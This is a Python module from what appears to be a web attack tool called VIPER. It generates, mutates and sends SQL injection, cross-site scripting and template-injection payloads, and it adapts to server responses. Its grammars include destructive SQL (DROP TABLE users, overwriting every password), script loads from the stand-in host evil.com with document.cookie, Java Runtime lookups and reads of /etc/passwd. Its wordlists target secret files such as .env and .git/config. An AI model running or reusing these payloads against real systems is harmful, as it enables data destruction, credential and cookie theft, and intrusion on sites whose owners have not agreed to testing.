#!/usr/bin/env python3
"""
VIPER Fuzzer Module - Intelligent Fuzzing Engine

Features:
- Mutation-based fuzzing
- Grammar-based payload generation
- Response-based adaptation
- Coverage tracking

Author: VIPER Contributors
"""

import random
import string
import base64
import urllib.parse
from typing import List, Dict, Generator, Optional, Callable
from dataclasses import dataclass
import itertools


@dataclass
class FuzzResult:
    """Result from a fuzz attempt."""
    payload: str
    mutation_type: str
    interesting: bool
    reason: Optional[str] = None


class PayloadMutator:
    """
    Mutates payloads using various techniques.
    """
    
    @staticmethod
    def bit_flip(payload: str, num_flips: int = 1) -> str:
        """Flip random bits in the payload."""
        if not payload:
            return payload
        
        chars = list(payload)
        for _ in range(num_flips):
            idx = random.randint(0, len(chars) - 1)
            char_code = ord(chars[idx])
            bit_pos = random.randint(0, 7)
            char_code ^= (1 << bit_pos)
            if 32 <= char_code <= 126:  # Keep printable
                chars[idx] = chr(char_code)
        
        return ''.join(chars)
    
    @staticmethod
    def insert_random(payload: str, char_set: str = None) -> str:
        """Insert random characters."""
        char_set = char_set or string.printable[:94]
        pos = random.randint(0, len(payload))
        char = random.choice(char_set)
        return payload[:pos] + char + payload[pos:]
    
    @staticmethod
    def delete_random(payload: str) -> str:
        """Delete a random character."""
        if len(payload) <= 1:
            return payload
        pos = random.randint(0, len(payload) - 1)
        return payload[:pos] + payload[pos + 1:]
    
    @staticmethod
    def swap_adjacent(payload: str) -> str:
        """Swap adjacent characters."""
        if len(payload) <= 1:
            return payload
        pos = random.randint(0, len(payload) - 2)
        chars = list(payload)
        chars[pos], chars[pos + 1] = chars[pos + 1], chars[pos]
        return ''.join(chars)
    
    @staticmethod
    def duplicate_section(payload: str) -> str:
        """Duplicate a random section."""
        if len(payload) < 2:
            return payload + payload
        start = random.randint(0, len(payload) - 1)
        length = random.randint(1, min(10, len(payload) - start))
        section = payload[start:start + length]
        return payload[:start] + section + section + payload[start + length:]
    
    @staticmethod
    def case_swap(payload: str) -> str:
        """Randomly swap case of characters."""
        return ''.join(
            c.swapcase() if random.random() > 0.5 else c
            for c in payload
        )
    
    @staticmethod
    def url_encode(payload: str, full: bool = False) -> str:
        """URL encode the payload."""
        if full:
            return ''.join(f'%{ord(c):02x}' for c in payload)
        return urllib.parse.quote(payload)
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode."""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def unicode_normalize(payload: str) -> str:
        """Apply Unicode normalization tricks."""
        replacements = {
            '<': ['\uff1c', '\u003c', '\u2039', '\u276e'],
            '>': ['\uff1e', '\u003e', '\u203a', '\u276f'],
            '/': ['\uff0f', '\u2215', '\u29f8'],
            '\\': ['\uff3c', '\u2216'],
            "'": ['\uff07', '\u2019', '\u02bc'],
            '"': ['\uff02', '\u201c', '\u201d'],
        }
        
        result = payload
        for char, alternatives in replacements.items():
            if char in result and random.random() > 0.5:
                result = result.replace(char, random.choice(alternatives), 1)
        
        return result
    
    @staticmethod
    def null_byte_inject(payload: str) -> str:
        """Inject null bytes."""
        positions = [0, len(payload), len(payload) // 2]
        pos = random.choice(positions)
        return payload[:pos] + '%00' + payload[pos:]
    
    @staticmethod
    def newline_inject(payload: str) -> str:
        """Inject newlines/CRLF."""
        injections = ['\n', '\r\n', '%0a', '%0d%0a', '\r', '%0d']
        pos = random.randint(0, len(payload))
        return payload[:pos] + random.choice(injections) + payload[pos:]
    
    def mutate(self, payload: str, mutations: int = 3) -> List[str]:
        """Apply multiple mutations to a payload."""
        mutators = [
            self.bit_flip,
            self.insert_random,
            self.delete_random,
            self.swap_adjacent,
            self.duplicate_section,
            self.case_swap,
            self.url_encode,
            self.unicode_normalize,
            self.null_byte_inject,
            self.newline_inject,
        ]
        
        results = [payload]  # Include original
        
        for _ in range(mutations):
            mutator = random.choice(mutators)
            try:
                mutated = mutator(payload)
                if mutated and mutated not in results:
                    results.append(mutated)
            except:
                pass
        
        return results


class GrammarFuzzer:
    """
    Grammar-based payload generation.
    Generates valid payloads based on grammar rules.
    """
    
    # SQL Injection grammar
    SQL_GRAMMAR = {
        "<sqli>": ["<union>", "<boolean>", "<error>", "<time>", "<stacked>"],
        "<union>": ["' UNION SELECT <columns>--", "' UNION ALL SELECT <columns>--"],
        "<boolean>": ["' AND <condition>--", "' OR <condition>--"],
        "<error>": ["' AND EXTRACTVALUE(<num>, <xpath>)--", "' AND (SELECT <num> FROM(SELECT COUNT(*),CONCAT(<payload>,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"],
        "<time>": ["' AND SLEEP(<num>)--", "'; WAITFOR DELAY '0:0:<num>'--", "' AND BENCHMARK(<bignum>,MD5('a'))--"],
        "<stacked>": ["'; <statement>--", "'; <statement>; <statement>--"],
        "<columns>": ["NULL", "NULL,NULL", "NULL,NULL,NULL", "1,2,3", "@@version,user(),database()"],
        "<condition>": ["1=1", "1=2", "'a'='a'", "<num>=<num>"],
        "<xpath>": ["concat(0x7e,(SELECT <what>),0x7e)", "0x7e"],
        "<what>": ["user()", "database()", "version()", "@@version"],
        "<statement>": ["DROP TABLE users", "INSERT INTO users VALUES('hacked','hacked')", "UPDATE users SET password='hacked'"],
        "<num>": ["1", "0", "5", "10"],
        "<bignum>": ["10000000", "50000000"],
        "<payload>": ["(SELECT user())", "(SELECT database())"],
    }
    
    # XSS grammar
    XSS_GRAMMAR = {
        "<xss>": ["<script_tag>", "<event_handler>", "<javascript_uri>", "<data_uri>"],
        "<script_tag>": ["<script><code></script>", "<script src=<url>></script>"],
        "<event_handler>": ["<tag <event>=<code>>", "<tag <event>=<code>/>"],
        "<javascript_uri>": ["javascript:<code>", "javascript:alert(<string>)"],
        "<data_uri>": ["data:text/html,<html_payload>", "data:text/html;base64,<base64>"],
        "<tag>": ["img", "svg", "body", "div", "input", "iframe", "video", "audio"],
        "<event>": ["onerror", "onload", "onclick", "onmouseover", "onfocus", "onblur"],
        "<code>": ["alert(<string>)", "prompt(<string>)", "console.log(<string>)", "eval(<string>)"],
        "<string>": ["1", "'XSS'", "document.domain", "document.cookie"],
        "<url>": ["//evil.com/xss.js", "https://evil.com/x"],
        "<html_payload>": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        "<base64>": ["PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="],
    }
    
    # SSTI grammar
    SSTI_GRAMMAR = {
        "<ssti>": ["<jinja>", "<twig>", "<velocity>", "<freemarker>", "<generic>"],
        "<jinja>": ["{{<expr>}}", "{%<statement>%}"],
        "<twig>": ["{{<expr>}}", "{%<statement>%}"],
        "<velocity>": ["#set($x=<expr>)$x", "$<var>.<method>"],
        "<freemarker>": ["${<expr>}", "<#<directive>>"],
        "<expr>": ["7*7", "config", "self.__class__", "request", "''.class.forName('java.lang.Runtime')"],
        "<statement>": ["if 1", "for x in range(1)"],
        "<var>": ["class", "request", "this"],
        "<method>": ["getClass()", "forName('java.lang.Runtime')"],
        "<directive>": ["assign x=1", "include '/etc/passwd'"],
        "<generic>": ["${7*7}", "{{7*7}}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}"],
    }
    
    def __init__(self, grammar: Dict[str, List[str]] = None):
        self.grammar = grammar or self.SQL_GRAMMAR
        self.max_depth = 10
    
    def generate(self, start: str = None, depth: int = 0) -> str:
        """Generate a payload from the grammar."""
        if depth > self.max_depth:
            return ""
        
        start = start or list(self.grammar.keys())[0]
        
        if start not in self.grammar:
            return start
        
        expansion = random.choice(self.grammar[start])
        
        # Find and expand non-terminals
        result = expansion
        for nonterminal in self.grammar.keys():
            while nonterminal in result:
                replacement = self.generate(nonterminal, depth + 1)
                result = result.replace(nonterminal, replacement, 1)
        
        return result
    
    def generate_batch(self, count: int = 10, start: str = None) -> List[str]:
        """Generate multiple payloads."""
        payloads = set()
        attempts = 0
        
        while len(payloads) < count and attempts < count * 3:
            payload = self.generate(start)
            if payload:
                payloads.add(payload)
            attempts += 1
        
        return list(payloads)


class SmartFuzzer:
    """
    Intelligent fuzzer that adapts based on responses.
    """
    
    def __init__(self):
        self.mutator = PayloadMutator()
        self.interesting_payloads = []
        self.coverage = set()
    
    def is_interesting(self, response: Dict) -> bool:
        """Determine if a response is interesting."""
        # Status code differences
        if response.get("status") in [500, 403, 401, 302]:
            return True
        
        # Error messages
        body = response.get("body", "").lower()
        error_indicators = [
            "error", "exception", "warning", "syntax",
            "sql", "mysql", "postgresql", "oracle",
            "stack trace", "traceback", "debug"
        ]
        if any(indicator in body for indicator in error_indicators):
            return True
        
        # Time-based
        if response.get("time", 0) > 5:
            return True
        
        # Size differences
        if response.get("size_diff", 0) > 1000:
            return True
        
        return False
    
    def fuzz(self, send_func: Callable, base_payloads: List[str],
            max_iterations: int = 100) -> List[FuzzResult]:
        """
        Run fuzzing campaign.
        
        Args:
            send_func: Function that sends payload and returns response dict
            base_payloads: Initial payloads to mutate
            max_iterations: Maximum fuzzing iterations
        
        Returns:
            List of interesting FuzzResults
        """
        results = []
        payload_queue = list(base_payloads)
        seen = set()
        iteration = 0
        
        while payload_queue and iteration < max_iterations:
            payload = payload_queue.pop(0)
            
            if payload in seen:
                continue
            seen.add(payload)
            
            # Send payload
            try:
                response = send_func(payload)
            except Exception as e:
                continue
            
            # Check if interesting
            if self.is_interesting(response):
                result = FuzzResult(
                    payload=payload,
                    mutation_type="base" if payload in base_payloads else "mutation",
                    interesting=True,
                    reason=self._get_reason(response)
                )
                results.append(result)
                self.interesting_payloads.append(payload)
                
                # Generate more mutations from interesting payload
                mutations = self.mutator.mutate(payload, mutations=5)
                payload_queue.extend(mutations)
            
            # Track coverage (unique response signatures)
            sig = f"{response.get('status')}_{response.get('size', 0) // 100}"
            if sig not in self.coverage:
                self.coverage.add(sig)
                # New coverage = more mutations
                mutations = self.mutator.mutate(payload, mutations=3)
                payload_queue.extend(mutations)
            
            iteration += 1
        
        return results
    
    async def async_fuzz(self, send_func, base_payloads: List[str],
                         max_iterations: int = 100) -> List[FuzzResult]:
        """
        Async version of fuzz(). send_func should be an async callable
        that takes a payload string and returns a response dict with
        keys: status, body, time, size.
        """
        results = []
        payload_queue = list(base_payloads)
        seen = set()
        iteration = 0

        while payload_queue and iteration < max_iterations:
            payload = payload_queue.pop(0)

            if payload in seen:
                continue
            seen.add(payload)

            try:
                response = await send_func(payload)
            except Exception:
                continue

            if self.is_interesting(response):
                result = FuzzResult(
                    payload=payload,
                    mutation_type="base" if payload in base_payloads else "mutation",
                    interesting=True,
                    reason=self._get_reason(response)
                )
                results.append(result)
                self.interesting_payloads.append(payload)

                mutations = self.mutator.mutate(payload, mutations=5)
                payload_queue.extend(mutations)

            sig = f"{response.get('status')}_{response.get('size', 0) // 100}"
            if sig not in self.coverage:
                self.coverage.add(sig)
                mutations = self.mutator.mutate(payload, mutations=3)
                payload_queue.extend(mutations)

            iteration += 1

        return results

    def _get_reason(self, response: Dict) -> str:
        """Get reason why response is interesting."""
        reasons = []
        
        if response.get("status") == 500:
            reasons.append("Server Error")
        if response.get("status") in [403, 401]:
            reasons.append("Auth Response")
        if response.get("time", 0) > 5:
            reasons.append(f"Slow ({response['time']:.1f}s)")
        
        body = response.get("body", "").lower()
        if "sql" in body or "syntax" in body:
            reasons.append("SQL Error")
        if "exception" in body or "traceback" in body:
            reasons.append("Exception")
        
        return ", ".join(reasons) if reasons else "Unknown"


class WordlistGenerator:
    """
    Generate wordlists for fuzzing.
    """
    
    @staticmethod
    def common_params() -> List[str]:
        """Common parameter names."""
        return [
            "id", "user", "username", "name", "email", "password",
            "pass", "passwd", "pwd", "token", "key", "api_key",
            "secret", "auth", "session", "sid", "ssid",
            "page", "p", "q", "query", "search", "s",
            "url", "uri", "path", "file", "filename", "f",
            "dir", "directory", "folder", "cat", "category",
            "action", "do", "cmd", "command", "exec", "run",
            "debug", "test", "admin", "root", "config",
            "redirect", "next", "return", "returnUrl", "goto",
            "callback", "cb", "ref", "referer", "referrer",
            "sort", "order", "orderby", "sortby", "filter",
            "limit", "offset", "start", "count", "num",
            "type", "format", "output", "out", "mode",
            "lang", "language", "locale", "l", "i18n",
            "theme", "template", "style", "css", "view",
        ]
    
    @staticmethod
    def common_dirs() -> List[str]:
        """Common directory names."""
        return [
            "admin", "administrator", "login", "signin", "auth",
            "api", "api/v1", "api/v2", "rest", "graphql",
            "backup", "backups", "bak", "old", "temp", "tmp",
            "uploads", "upload", "files", "static", "assets",
            "images", "img", "media", "docs", "documents",
            "config", "conf", "settings", "setup", "install",
            "test", "tests", "testing", "debug", "dev",
            "include", "includes", "inc", "lib", "libs",
            "scripts", "js", "javascript", "css", "style",
            "cgi-bin", "cgi", "bin", "exec",
            "private", "secret", "hidden", "internal",
            "dashboard", "panel", "control", "manage",
            "user", "users", "account", "profile", "member",
            ".git", ".svn", ".hg", ".env", ".htaccess",
        ]
    
    @staticmethod
    def common_files() -> List[str]:
        """Common file names."""
        return [
            "index.php", "index.html", "default.asp", "default.aspx",
            "config.php", "config.json", "config.yml", "config.xml",
            "settings.php", "settings.json", "database.php",
            ".env", ".env.local", ".env.prod", ".env.backup",
            "robots.txt", "sitemap.xml", "crossdomain.xml",
            "phpinfo.php", "info.php", "test.php", "debug.php",
            "backup.sql", "dump.sql", "database.sql", "db.sql",
            "backup.zip", "backup.tar.gz", "site.zip", "www.zip",
            ".htaccess", ".htpasswd", "web.config",
            "README.md", "CHANGELOG.md", "LICENSE",
            "package.json", "composer.json", "requirements.txt",
            ".git/config", ".git/HEAD", ".gitignore",
            "wp-config.php", "wp-login.php",
            "server-status", "server-info",
        ]
    
    @staticmethod
    def numeric_range(start: int, end: int) -> Generator[str, None, None]:
        """Generate numeric range."""
        for i in range(start, end + 1):
            yield str(i)
    
    @staticmethod
    def alphanumeric(length: int, count: int) -> Generator[str, None, None]:
        """Generate random alphanumeric strings."""
        chars = string.ascii_lowercase + string.digits
        for _ in range(count):
            yield ''.join(random.choice(chars) for _ in range(length))


# Export
__all__ = [
    "PayloadMutator",
    "GrammarFuzzer",
    "SmartFuzzer",
    "WordlistGenerator",
    "FuzzResult"
]
